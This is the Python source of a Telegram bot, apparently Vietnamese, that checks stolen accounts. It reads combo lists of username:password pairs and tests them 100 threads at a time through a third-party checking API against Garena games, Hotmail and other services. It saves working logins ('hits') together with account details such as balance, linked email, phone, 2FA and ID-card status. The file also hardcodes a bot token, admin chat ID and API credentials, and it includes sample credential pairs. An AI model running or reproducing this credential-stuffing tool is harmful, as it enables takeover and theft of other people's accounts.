# bot.py - GARENA CHECKER BOT - FULL HOÀN CHỈNH + TREO 24/7
import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

# ========== CẤU HÌNH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 100
DEFAULT_TIMEOUT = 30
DEFAULT_RETRIES = 3

OUTPUT_HITS = "hits.txt"
OUTPUT_DEAD = "dead.txt"
OUTPUT_FILTERED = "filtered_accounts.txt"
OUTPUT_CHECKED = "checked_accounts.txt"

# ========== DANH SÁCH SERVICE ==========
SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Liên Quân Mobile",
        "icon": "🎮"
    },
    "miniworld": {
        "route": "/api/miniworld",
        "desc": "Mini World",
        "icon": "🌍"
    },
    "blockmango": {
        "route": "/api/blockmango",
        "desc": "Blockman Go",
        "icon": "🧱"
    },
    "deltaforce": {
        "route": "/api/deltaforce",
        "desc": "Delta Force",
        "icon": "🔫"
    },
    "hotmail": {
        "route": "/api/hotmail",
        "desc": "Hotmail",
        "icon": "📧"
    },
    "fc": {
        "route": "/api/fc",
        "desc": "FC Online",
        "icon": "⚽"
    },
    "fullpack": {
        "route": "/api/fullpack",
        "desc": "Fullpack",
        "icon": "📦"
    }
}

# ========== BIẾN TOÀN CỤC ==========
checking = False
stop_event = threading.Event()
filtered_accounts = []
pending_accounts = []
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
api_cache = {}
cache_lock = threading.Lock()
bot_start_time = datetime.now()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

def is_admin(chat_id):
    return str(chat_id) == str(ADMIN_CHAT_ID)

# ========== LỌC TK MK ==========
def loc_tk_mk(content):
    """Lọc user:pass từ nội dung"""
    accounts = []
    seen = set()
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        user = None
        pwd = None
        
        for sep in [':', '|', '/', '\t']:
            if sep in line:
                parts = line.split(sep, 1)
                user = parts[0].strip()
                pwd = parts[1].strip()
                break
        
        if user and pwd:
            user = re.sub(r'[^\w.@-]', '', user)
            pwd = pwd.strip()
            if len(user) > 0 and len(pwd) > 0:
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
    
    return accounts

# ========== CHECK API ==========
def check_account_api(username, password, service):
    route = SERVICE_ROUTES.get(service, {}).get("route", "/api/lienquan")
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD,
        "tk": username,
        "mk": password
    }
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(url, params=params, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        if data.get("status") == True or data.get("success") == True:
                            data["result"] = "hit"
                        elif data.get("status") == False or data.get("success") == False:
                            data["result"] = "dead"
                        else:
                            if "uid" in data or "name" in data or "data" in data:
                                data["result"] = "hit"
                            else:
                                data["result"] = "dead"
                    return data
                except json.JSONDecodeError:
                    return {"result": "unknown", "raw": resp.text[:200]}
            elif resp.status_code == 429:
                time.sleep(5)
            else:
                time.sleep(1)
        except:
            time.sleep(2)
    
    return {"result": "error", "message": "Request failed"}

# ========== FORMAT KẾT QUẢ ĐẸP ==========
def format_hit_dep(username, password, data, service=""):
    if isinstance(data, str):
        try:
            data = json.loads(data)
        except:
            pass
    
    if not isinstance(data, dict):
        return f"""
╔══════════════════════════════════╗
║          ✅ HIT                   ║
╠══════════════════════════════════╣
║ 🔑 {username}:{password}
╚══════════════════════════════════╝
"""
    
    uid = data.get("uid", data.get("id", "N/A"))
    name = data.get("name", data.get("nickname", data.get("aov_name", data.get("display_name", "N/A"))))
    region = data.get("region", data.get("country", "VN"))
    
    shells = data.get("shells", data.get("so", data.get("coins", 0)))
    nap_so = data.get("nap_so", data.get("last_recharge", data.get("recharge", "N/A")))
    
    email = data.get("email", data.get("mail", data.get("email_address", "")))
    email_verified = data.get("email_verified", data.get("mail_verified", data.get("email_verified", False)))
    email_str = "✅ Đã xác thực" if email_verified else "❌ Chưa xác thực"
    if email:
        email_display = f"{email[:3]}***@{email.split('@')[1] if '@' in email else 'gmail.com'}"
    else:
        email_display = "Không có"
    
    mobile = data.get("mobile", data.get("sdt", data.get("phone", "")))
    mobile_bound = data.get("mobile_bound", data.get("sdt_bound", data.get("phone_verified", False)))
    if mobile_bound and mobile:
        mobile_display = f"{mobile[:4]}***{mobile[-3:] if len(mobile) > 3 else ''}"
    else:
        mobile_display = "Chưa liên kết"
    
    password_set = data.get("password_set", data.get("has_password", True))
    pass_str = "✅ Có" if password_set else "❌ Không"
    
    fb_linked = data.get("fb_linked", data.get("fb", data.get("facebook_linked", False)))
    fb_id = data.get("fb_id", data.get("facebook_id", ""))
    if fb_linked and fb_id:
        fb_str = f"✅ Liên kết [{fb_id}]"
    elif fb_linked:
        fb_str = "✅ Đã liên kết"
    else:
        fb_str = "❌ Chưa liên kết"
    
    aov_banned = data.get("aov_banned", data.get("banned", data.get("is_banned", "NO")))
    band_str = "🔴 BANNED" if str(aov_banned).upper() in ["YES", "TRUE", "1", "BANNED"] else "🟢 Bình thường"
    
    last_login = data.get("last_login", data.get("last_login_time", data.get("login_last", "N/A")))
    created = data.get("created", data.get("tao_gr", data.get("created_at", data.get("register_time", "N/A"))))
    
    aov_rank = data.get("aov_rank", data.get("rank", data.get("tier", "N/A")))
    aov_level = data.get("aov_level", data.get("level", data.get("lv", 0)))
    aov_total_skins = data.get("aov_total_skins", data.get("skin", data.get("skins", data.get("total_skins", 0))))
    aov_total_champs = data.get("aov_total_champs", data.get("hero", data.get("champs", data.get("heroes", 0))))
    
    qh = data.get("qh", data.get("quan_he", data.get("friends", 0)))
    cccd = data.get("cccd", data.get("cmnd", data.get("id_card", "No")))
    authen = data.get("authen", data.get("2fa", data.get("two_factor", "No")))
    
    cccd_str = "✅ Có" if cccd and cccd != "No" else "❌ Không"
    authen_str = "✅ Có" if authen and authen != "No" else "❌ Không"
    
    status_parts = []
    if fb_linked:
        status_parts.append("FB")
    if mobile_bound:
        status_parts.append("SĐT")
    if email_verified:
        status_parts.append("Email")
    if password_set:
        status_parts.append("Pass")
    
    status_str = " | ".join(status_parts) if status_parts else "Acc thường"
    
    service_icon = SERVICE_ROUTES.get(service, {}).get("icon", "🎮")
    
    return f"""
╔══════════════════════════════════╗
║          ✅ HIT                   ║
╠══════════════════════════════════╣
║ {service_icon} Service: {service.upper()}
║ 🔑 {username}:{password}
║ ────────────────────────────────
║ 🆔 UID: {uid}
║ 👤 Nick: {name}
║ 🌐 Region: {region}
║ 💲 Sò: {shells}
║ 💰 Nạp: {nap_so}
║ ────────────────────────────────
║ 📩 Email: {email_display} {email_str}
║ 📱 SĐT: {mobile_display}
║ 🛡 Pass: {pass_str}
║ 🔗 FB: {fb_str}
║ ────────────────────────────────
║ ⚠️ Status: {band_str}
║ ⏰ Login cuối: {last_login}
║ 📅 Tạo GR: {created}
║ ────────────────────────────────
║ 👑 Rank: {aov_rank}
║ ✨ Level: {aov_level}
║ 💎 Skin: {aov_total_skins}
║ ⚔️ Hero: {aov_total_champs}
║ 👥 Friends: {qh}
║ ────────────────────────────────
║ 📄 CCCD: {cccd_str}
║ 🔐 2FA: {authen_str}
║ 📋 Status: {status_str}
╚══════════════════════════════════╝
"""

def format_dead_dep(username, password, service=""):
    service_icon = SERVICE_ROUTES.get(service, {}).get("icon", "🎮")
    return f"""
╔══════════════════════════════════╗
║          ❌ DEAD                 ║
╠══════════════════════════════════╣
║ {service_icon} Service: {service.upper()}
║ 🔑 {username}:{password}
║ ────────────────────────────────
║ ⚠️ Tài khoản không hợp lệ
╚══════════════════════════════════╝
"""

def format_error_dep(username, password, service=""):
    service_icon = SERVICE_ROUTES.get(service, {}).get("icon", "🎮")
    return f"""
╔══════════════════════════════════╗
║          ⚠️ ERROR                ║
╠══════════════════════════════════╣
║ {service_icon} Service: {service.upper()}
║ 🔑 {username}:{password}
║ ────────────────────────────────
║ ❌ Lỗi khi check
╚══════════════════════════════════╝
"""

# ========== TẠO NÚT BẤM ==========
def create_main_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("📝 Gửi TK MK"),
        KeyboardButton("📁 Gửi File TXT"),
        KeyboardButton("🔍 Lọc TK MK từ TXT"),
        KeyboardButton("📊 Trạng thái"),
        KeyboardButton("📥 Tải Hits"),
        KeyboardButton("📥 Tải Dead"),
        KeyboardButton("⏹ Dừng check"),
        KeyboardButton("👤 Admin"),
        KeyboardButton("📋 Danh sách Service")
    ]
    keyboard.add(*buttons)
    return keyboard

def create_service_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = []
    
    for key, value in SERVICE_ROUTES.items():
        btn = InlineKeyboardButton(
            f"{value['icon']} {value['desc']}",
            callback_data=f"check_{key}"
        )
        buttons.append(btn)
    
    keyboard.add(*buttons)
    
    keyboard.row(
        InlineKeyboardButton("📥 Hits", callback_data="get_hits"),
        InlineKeyboardButton("📥 Dead", callback_data="get_dead"),
        InlineKeyboardButton("⏹ Stop", callback_data="stop_check")
    )
    keyboard.row(
        InlineKeyboardButton("❌ Hủy", callback_data="cancel_check")
    )
    
    return keyboard

def create_admin_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("👤 Admin: @baohuyno1", url="https://t.me/baohuyno1"),
        InlineKeyboardButton("📊 Trạng thái", callback_data="admin_status"),
        InlineKeyboardButton("📥 Hits", callback_data="admin_hits"),
        InlineKeyboardButton("📥 Dead", callback_data="admin_dead"),
        InlineKeyboardButton("⏹ Dừng check", callback_data="admin_stop"),
        InlineKeyboardButton("🗑 Xóa pending", callback_data="admin_clear"),
        InlineKeyboardButton("📋 Danh sách service", callback_data="admin_services"),
        InlineKeyboardButton("📁 Tải filtered", callback_data="admin_filtered")
    ]
    keyboard.add(*buttons)
    return keyboard

# ========== CHECK ĐƠN ==========
def check_single_account(chat_id, username, password, service="lienquan"):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    bot.send_message(chat_id, f"🔍 Đang check <code>{username}:{password}</code> với {service_desc}...")
    
    result = check_account_api(username, password, service)
    result_type = result.get("result", "unknown")
    
    if result_type == "hit":
        with file_lock:
            with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        bot.send_message(chat_id, format_hit_dep(username, password, result, service))
    elif result_type == "dead":
        with file_lock:
            with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        bot.send_message(chat_id, format_dead_dep(username, password, service))
    else:
        bot.send_message(chat_id, format_error_dep(username, password, service))

# ========== CHECK NHIỀU ACCOUNT ==========
def check_accounts_batch(chat_id, accounts, service):
    global checking, stats
    
    if checking:
        bot.send_message(chat_id, "⚠️ Đang check rồi!")
        return
    
    checking = True
    stop_event.clear()
    
    total = len(accounts)
    stats = {
        "total": total,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
    
    bot.send_message(chat_id, f"""
{icon} <b>BẮT ĐẦU CHECK</b>
📊 Tổng: <code>{total}</code> accounts
🎯 Service: <b>{service_desc}</b>
⚡ Threads: <code>{DEFAULT_THREADS}</code>
""")
    
    def process_single(user, pwd):
        if stop_event.is_set():
            return
        
        result = check_account_api(user, pwd, service)
        result_type = result.get("result", "unknown")
        
        with stats_lock:
            stats["checked"] += 1
            
            if result_type == "hit":
                stats["hits"] += 1
                with file_lock:
                    with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                        f.write(f"{user}:{pwd}\n")
                try:
                    bot.send_message(chat_id, format_hit_dep(user, pwd, result, service))
                except:
                    pass
            elif result_type == "dead":
                stats["dead"] += 1
                with file_lock:
                    with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                        f.write(f"{user}:{pwd}\n")
            else:
                stats["errors"] += 1
            
            if stats["checked"] % 50 == 0:
                try:
                    elapsed = time.time() - stats["start_time"]
                    speed = stats["checked"] / elapsed if elapsed > 0 else 0
                    bot.send_message(chat_id, f"""
📊 <b>TIẾN ĐỘ</b>
✅ Checked: <code>{stats['checked']}/{total}</code>
🔴 Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
""")
                except:
                    pass
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_single, user, pwd): (user, pwd) 
                   for user, pwd in accounts}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    
    result_msg = f"""
✅ <b>CHECK HOÀN TẤT!</b>
📊 Tổng: <code>{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚠️ Errors: <code>{stats['errors']}</code>
⏱ Thời gian: <code>{elapsed:.1f}s</code>
⚡ Tốc độ: <code>{stats['total']/elapsed:.1f}</code> acc/s
"""
    bot.send_message(chat_id, result_msg)
    
    if stats["hits"] > 0 and os.path.exists(OUTPUT_HITS):
        with open(OUTPUT_HITS, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"✅ hits.txt ({stats['hits']} acc)")

# ========== XỬ LÝ CALLBACK ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    global pending_accounts, filtered_accounts, checking
    
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Bạn không có quyền!")
        return
    
    data = call.data
    
    if data.startswith("check_"):
        service = data.replace("check_", "")
        
        if service not in SERVICE_ROUTES:
            bot.answer_callback_query(call.id, "❌ Service không hợp lệ!")
            return
        
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        
        service_desc = SERVICE_ROUTES[service]["desc"]
        icon = SERVICE_ROUTES[service]["icon"]
        
        if pending_accounts:
            accounts = pending_accounts
            pending_accounts = []
            
            if len(accounts) == 1:
                user, pwd = accounts[0]
                bot.send_message(call.message.chat.id, f"{icon} Đang check <code>{user}:{pwd}</code> với {service_desc}...")
                threading.Thread(target=check_single_account, args=(call.message.chat.id, user, pwd, service)).start()
            else:
                filtered_accounts = accounts
                bot.send_message(call.message.chat.id, f"{icon} Đang check {len(accounts)} acc với {service_desc}...")
                threading.Thread(target=check_accounts_batch, args=(call.message.chat.id, accounts, service)).start()
        else:
            bot.answer_callback_query(call.id, "❌ Không có accounts để check!")
    
    elif data == "admin_status":
        if checking:
            elapsed = time.time() - stats.get("start_time", time.time())
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            bot.send_message(call.message.chat.id, f"""
📊 <b>TRẠNG THÁI</b>
🔄 Đang check: <b>YES</b>
✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
⏱ Thời gian: <code>{elapsed:.0f}s</code>
""")
        else:
            bot.send_message(call.message.chat.id, "💤 Bot đang rảnh")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="✅ hits.txt")
        except:
            bot.send_message(call.message.chat.id, "❌ Chưa có hits!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="❌ dead.txt")
        except:
            bot.send_message(call.message.chat.id, "❌ Chưa có dead!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_stop":
        stop_event.set()
        checking = False
        bot.send_message(call.message.chat.id, "🛑 Đã dừng check!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_clear":
        pending_accounts = []
        bot.send_message(call.message.chat.id, "✅ Đã xóa danh sách pending!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_services":
        msg = "📋 <b>DANH SÁCH SERVICE</b>\n\n"
        for key, value in SERVICE_ROUTES.items():
            msg += f"{value['icon']} <b>{value['desc']}</b>\n"
            msg += f"   Route: <code>{value['route']}</code>\n\n"
        bot.send_message(call.message.chat.id, msg)
        bot.answer_callback_query(call.id)
    
    elif data == "admin_filtered":
        try:
            with open(OUTPUT_FILTERED, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="📁 filtered_accounts.txt")
        except:
            bot.send_message(call.message.chat.id, "❌ Chưa có file filtered!")
        bot.answer_callback_query(call.id)
    
    elif data == "get_hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="✅ hits.txt")
        except:
            bot.send_message(call.message.chat.id, "❌ Chưa có hits!")
        bot.answer_callback_query(call.id)
    
    elif data == "get_dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="❌ dead.txt")
        except:
            bot.send_message(call.message.chat.id, "❌ Chưa có dead!")
        bot.answer_callback_query(call.id)
    
    elif data == "stop_check":
        stop_event.set()
        checking = False
        bot.send_message(call.message.chat.id, "🛑 Đã dừng check!")
        bot.answer_callback_query(call.id)
    
    elif data == "cancel_check":
        pending_accounts = []
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        bot.send_message(call.message.chat.id, "❌ Đã hủy check!")
        bot.answer_callback_query(call.id)
    
    bot.answer_callback_query(call.id)

# ========== XỬ LÝ TEXT ==========
@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not is_admin(message.chat.id):
        return
    
    text = message.text.strip()
    
    if text == "📝 Gửi TK MK":
        bot.reply_to(message, """
📌 <b>GỬI TK MK</b>
Gửi trực tiếp <code>user:pass</code> hoặc nhiều accounts

VD:
<code>user1:pass123</code>
<code>user2:pass456</code>
<code>user3:pass789</code>
""")
        return
    
    elif text == "📁 Gửi File TXT":
        bot.reply_to(message, """
📌 <b>GỬI FILE TXT</b>
Gửi file .txt chứa danh sách tk mk
Bot sẽ tự động lọc và hiển thị nút chọn service
""")
        return
    
    elif text == "🔍 Lọc TK MK từ TXT":
        bot.reply_to(message, """
🔍 <b>LỌC TK MK TỪ TXT</b>

📌 Gửi file .txt chứa danh sách tài khoản
Bot sẽ lọc chỉ giữ lại <code>user:pass</code>

📌 Hỗ trợ định dạng:
• <code>user:pass</code>
• <code>user|pass</code>
• <code>user/pass</code>

📌 Sau khi lọc xong, chọn service để check!
""")
        return
    
    elif text == "📊 Trạng thái":
        if checking:
            elapsed = time.time() - stats.get("start_time", time.time())
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            bot.reply_to(message, f"""
📊 <b>TRẠNG THÁI</b>
🔄 Đang check: <b>YES</b>
✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
⏱ Thời gian: <code>{elapsed:.0f}s</code>
""")
        else:
            bot.reply_to(message, "💤 Bot đang rảnh")
        return
    
    elif text == "📥 Tải Hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="✅ hits.txt")
        except:
            bot.reply_to(message, "❌ Chưa có hits!")
        return
    
    elif text == "📥 Tải Dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="❌ dead.txt")
        except:
            bot.reply_to(message, "❌ Chưa có dead!")
        return
    
    elif text == "⏹ Dừng check":
        stop_event.set()
        checking = False
        bot.reply_to(message, "🛑 Đã dừng check!")
        return
    
    elif text == "👤 Admin":
        bot.send_message(message.chat.id, """
👤 <b>ADMIN</b>
📌 Admin: @baohuyno1
🔗 Liên hệ: https://t.me/baohuyno1

📋 <b>CHỨC NĂNG ADMIN:</b>
• Quản lý bot
• Xem trạng thái
• Tải hits/dead
• Dừng check
• Xóa pending
""", reply_markup=create_admin_keyboard())
        return
    
    elif text == "📋 Danh sách Service":
        msg = "📋 <b>DANH SÁCH SERVICE</b>\n\n"
        for key, value in SERVICE_ROUTES.items():
            msg += f"{value['icon']} <b>{value['desc']}</b>\n"
            msg += f"   Route: <code>{value['route']}</code>\n\n"
        bot.send_message(message.chat.id, msg)
        return
    
    if text.startswith('/'):
        return
    
    accounts = loc_tk_mk(text)
    
    if not accounts:
        bot.reply_to(message, """
❌ <b>KHÔNG TÌM THẤY!</b>
Format đúng: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>

📌 Ví dụ:
<code>ZzkeconzZ:thanhoppa2001</code>
""")
        return
    
    global pending_accounts
    pending_accounts = accounts
    
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    
    msg = f"""
📌 <b>ĐÃ NHẬN {total} ACCOUNTS</b>

<b>Preview (10 dòng đầu):</b>
<code>{preview}</code>
{"..." if total > 10 else ""}

👇 <b>Chọn service để check:</b>
"""
    
    bot.send_message(message.chat.id, msg, reply_markup=create_service_keyboard())

# ========== XỬ LÝ FILE ==========
@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not is_admin(message.chat.id):
        return
    
    global pending_accounts
    
    try:
        if not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Chỉ hỗ trợ file .txt!")
            return
        
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        accounts = loc_tk_mk(content)
        
        if not accounts:
            bot.reply_to(message, "❌ Không tìm thấy user:pass trong file!")
            return
        
        pending_accounts = accounts
        
        with open(OUTPUT_FILTERED, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")
        
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        
        msg = f"""
✅ <b>LỌC XONG!</b>
📊 Tổng: <code>{total}</code> accounts

<b>Preview (20 dòng đầu):</b>
<code>{preview}</code>
{"..." if total > 20 else ""}

👇 <b>Chọn service để check:</b>
"""
        
        bot.send_message(message.chat.id, msg, reply_markup=create_service_keyboard())
        
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi: {e}")

# ========== LỆNH /start ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_admin(message.chat.id):
        return
    
    uptime = datetime.now() - bot_start_time
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    bot.send_message(message.chat.id, f"""
🤖 <b>GARENA CHECKER BOT</b>
👤 Admin: <a href="https://t.me/baohuyno1">@baohuyno1</a>
⏱ Uptime: <code>{hours}h {minutes}m</code>

📌 <b>CÁCH DÙNG:</b>

1️⃣ <b>GỬI TK MK</b>
Gửi trực tiếp <code>user:pass</code>
→ Chọn service bằng nút bấm

2️⃣ <b>GỬI FILE TXT</b>
Gửi file .txt chứa danh sách
→ Chọn service bằng nút bấm

3️⃣ <b>LỌC TK MK TỪ TXT</b>
Nhấn nút <b>"🔍 Lọc TK MK từ TXT"</b>
→ Gửi file .txt để lọc

4️⃣ <b>SỬ DỤNG NÚT</b>
• 📝 Gửi TK MK - Hướng dẫn
• 📁 Gửi File TXT - Hướng dẫn
• 🔍 Lọc TK MK từ TXT - Lọc file
• 📊 Trạng thái - Xem tiến độ
• 📥 Tải Hits - Tải hits.txt
• 📥 Tải Dead - Tải dead.txt• ⏹ Dừng check - Dừng check
• 👤 Admin - Liên hệ admin
• 📋 Danh sách Service - Xem services

⚡ <b>THREADS:</b> {DEFAULT_THREADS}
📋 <b>SERVICES:</b> {', '.join(SERVICE_ROUTES.keys())}

💡 <b>BOT 24/7 - LUÔN SẴN SÀNG</b>
""", reply_markup=create_main_keyboard())

# ========== LỆNH /help ==========
@bot.message_handler(commands=['help'])
def cmd_help(message):
    if not is_admin(message.chat.id):
        return
    
    bot.send_message(message.chat.id, f"""
📌 <b>HƯỚNG DẪN SỬ DỤNG</b>

<b>1. CHECK ĐƠN:</b>
Gửi trực tiếp: <code>user:pass</code>
→ Chọn service

<b>2. CHECK HÀNG LOẠT:</b>
Gửi file .txt hoặc nhiều accounts
→ Chọn service

<b>3. LỌC TK MK:</b>
Nhấn nút <b>"🔍 Lọc TK MK từ TXT"</b>
→ Gửi file .txt

<b>4. CÁC LỆNH:</b>
<code>/start</code> - Khởi động bot
<code>/help</code> - Hướng dẫn
<code>/loc</code> - Lọc tk mk từ txt
<code>/status</code> - Xem trạng thái
<code>/stop</code> - Dừng check
<code>/hits</code> - Tải hits.txt
<code>/dead</code> - Tải dead.txt
<code>/clear</code> - Xóa pending
<code>/services</code> - Xem services

<b>5. HỖ TRỢ:</b>
👤 Admin: @baohuyno1
""", reply_markup=create_main_keyboard())

# ========== LỆNH /loc ==========
@bot.message_handler(commands=['loc'])
def cmd_loc(message):
    if not is_admin(message.chat.id):
        return
    
    bot.reply_to(message, """
🔍 <b>LỌC TK MK TỪ TXT</b>

📌 <b>CÁCH DÙNG:</b>
1️⃣ Nhấn nút <b>"🔍 Lọc TK MK từ TXT"</b>
2️⃣ Gửi file .txt chứa danh sách
3️⃣ Bot tự động lọc ra user:pass

📌 <b>HỖ TRỢ ĐỊNH DẠNG:</b>
• <code>user:pass</code>
• <code>user|pass</code>
• <code>user/pass</code>
• <code>user    pass</code> (tab)

📌 <b>VÍ DỤ:</b>
<code>ZzkeconzZ:thanhoppa2001</code>
<code>anhduckim1|kimanhduc1</code>
<code>trannamtrungzzz/cuong2001</code>
""")

# ========== LỆNH /status ==========
@bot.message_handler(commands=['status'])
def cmd_status(message):
    if not is_admin(message.chat.id):
        return
    
    if checking:
        elapsed = time.time() - stats.get("start_time", time.time())
        speed = stats["checked"] / elapsed if elapsed > 0 else 0
        bot.reply_to(message, f"""
📊 <b>TRẠNG THÁI</b>
🔄 Đang check: <b>YES</b>
✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
⏱ Thời gian: <code>{elapsed:.0f}s</code>
""")
    else:
        bot.reply_to(message, "💤 Bot đang rảnh")

# ========== LỆNH /stop ==========
@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not is_admin(message.chat.id):
        return
    
    global checking
    stop_event.set()
    checking = False
    bot.reply_to(message, "🛑 Đã dừng check!")

# ========== LỆNH /hits ==========
@bot.message_handler(commands=['hits'])
def cmd_hits(message):
    if not is_admin(message.chat.id):
        return
    
    try:
        with open(OUTPUT_HITS, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="✅ hits.txt")
    except:
        bot.reply_to(message, "❌ Chưa có hits!")

# ========== LỆNH /dead ==========
@bot.message_handler(commands=['dead'])
def cmd_dead(message):
    if not is_admin(message.chat.id):
        return
    
    try:
        with open(OUTPUT_DEAD, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="❌ dead.txt")
    except:
        bot.reply_to(message, "❌ Chưa có dead!")

# ========== LỆNH /clear ==========
@bot.message_handler(commands=['clear'])
def cmd_clear(message):
    if not is_admin(message.chat.id):
        return
    
    global pending_accounts
    pending_accounts = []
    bot.reply_to(message, "✅ Đã xóa danh sách pending!")

# ========== LỆNH /services ==========
@bot.message_handler(commands=['services'])
def cmd_services(message):
    if not is_admin(message.chat.id):
        return
    
    msg = "📋 <b>DANH SÁCH SERVICE</b>\n\n"
    for key, value in SERVICE_ROUTES.items():
        msg += f"{value['icon']} <b>{value['desc']}</b>\n"
        msg += f"   Route: <code>{value['route']}</code>\n\n"
    bot.send_message(message.chat.id, msg)

# ========== GIỮ BOT 24/7 ==========
def keep_alive():
    """Giữ bot sống bằng cách ping mỗi 5 phút"""
    while True:
        try:
            time.sleep(300)  # 5 phút
            print(f"[*] Keep alive ping at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        except:
            pass

# ========== MAIN ==========
def main():
    print("=" * 60)
    print("    GARENA CHECKER BOT - 24/7")
    print("    ADMIN: @baohuyno1")
    print("=" * 60)
    print(f"[*] Threads: {DEFAULT_THREADS}")
    print(f"[*] Services: {len(SERVICE_ROUTES)}")
    print(f"[*] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    
    # Chạy keep alive trong thread riêng
    threading.Thread(target=keep_alive, daemon=True).start()
    
    try:
        bot.send_message(ADMIN_CHAT_ID, f"""
🤖 Bot đã khởi động!

📌 CÁCH DÙNG:
• Gửi user:pass -> Chọn service
• Gửi file .txt -> Chọn service
• Nhấn "🔍 Lọc TK MK từ TXT" -> Gửi file để lọc

👤 Admin: @baohuyno1
